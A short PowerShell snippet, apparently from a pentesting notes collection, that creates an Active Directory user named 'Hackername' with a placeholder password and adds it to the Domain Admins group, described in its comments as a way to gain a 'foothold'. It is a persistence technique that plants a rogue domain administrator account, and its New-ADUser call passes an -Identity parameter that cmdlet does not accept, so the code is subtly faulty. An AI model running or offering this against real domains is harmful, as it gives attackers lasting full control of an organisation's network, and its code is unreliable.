#-this can be used for systems administration and authorized pentesting to create a domain admin account for a foothold-
#create a new ad user

New-ADUser -Identity "Hackername" -SamAccountName "Hackername" -AccountPassword (Convertto-SecureString -AsPlaintext "Passwordhere" -Force) -Enabled $True

#add the hacker account to domain admin group

Add-AdGroupMember -Identity "Domain Admins" -Members "Hackername"
